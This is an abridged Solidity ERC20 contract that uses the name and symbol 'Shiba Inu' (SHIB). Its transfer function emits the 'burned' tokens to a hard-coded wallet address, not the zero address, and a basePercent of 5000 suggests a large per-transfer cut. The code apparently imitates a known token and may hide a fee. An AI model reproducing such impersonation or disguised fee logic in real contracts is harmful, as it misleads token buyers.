...
contract shib is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;

  string constant tokenName = "Shiba Inu";
  string constant tokenSymbol = "SHIB";
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 50000000000000000000;
  uint256 public basePercent = 5000;
  ...
  function transfer(address to, uint256 value) public returns (bool) {
    ...
    emit Transfer(msg.sender, 0xA0092Dde9B61Ef740180D2f6735a405BeE734374, tokensToBurn);
    return true;
  }
